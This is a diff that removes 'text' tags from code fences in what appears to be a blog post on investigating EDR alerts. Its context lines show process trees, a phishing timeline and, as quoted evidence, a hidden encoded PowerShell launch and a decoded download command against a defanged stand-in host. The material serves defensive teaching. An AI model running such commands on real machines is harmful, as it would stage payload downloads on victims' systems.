@@ -19,7 +19,7 @@ coverImageAlt: "Terminal-style illustration of an alert-to-conclusion pipeline: 
 
 An EDR alert fires.
 
-```text
+```
 [High Severity] Suspicious PowerShell Activity
 
 Host:    WS-042
@@ -128,7 +128,7 @@ A weak investigation stays inside the alert's original context and cross-referen
 
 Take a login event.
 
-```text
+```
 User:       maya@example.com
 Source IP:  198.51.100.42
 Country:    Netherlands
@@ -183,14 +183,14 @@ A theory that's only ever been tested against evidence that agrees with it hasn'
 
 The same binary means different things depending on what's above and below it.
 
-```text
+```
 explorer.exe
   └── powershell.exe
 ```
 
 Ordinary, in most environments. A user or a normal workflow spawned a shell.
 
-```text
+```
 winword.exe
   └── powershell.exe
         └── rundll32.exe
@@ -198,7 +198,7 @@ winword.exe
 
 A document opened, and it spawned a shell, which spawned another living-off-the-land binary. Worth immediate attention, though still not automatic proof, some environments run legitimate macros that do exactly this.
 
-```text
+```
 sccm-agent.exe
   └── powershell.exe
 ```
@@ -211,7 +211,7 @@ Same process name in every example. The parent tells you almost everything, and 
 
 Isolated events are hard to read. A sequence usually isn't.
 
-```text
+```
 09:02  User receives email
 09:04  Browser opens link from email
 09:05  powershell.exe launches
@@ -311,7 +311,7 @@ The opposite mistake is just as costly. Something unfamiliar to you isn't automa
 
 An EDR alert fires.
 
-```text
+```
 Host:      FIN-WS-07
 User:      sarah
 Alert:     Suspicious PowerShell
@@ -323,7 +323,7 @@ Command:   powershell.exe -nop -w hidden -enc <base64>
 
 **Validate.** Decode the payload safely. It resolves to:
 
-```text
+```
 iwr hxxps://cdn-update.example/file.dat -OutFile $env:TEMP\update.dat
 ```
 
@@ -331,7 +331,7 @@ A download command. That's stronger than the original alert on its own, but stil
 
 **Process tree.**
 
-```text
+```
 outlook.exe
   └── winword.exe
         └── powershell.exe
@@ -355,7 +355,7 @@ What started as a single suspicious-PowerShell alert is now a confirmed phishing
 
 Same starting point:
 
-```text
+```
 powershell.exe -enc ...
 ```
 
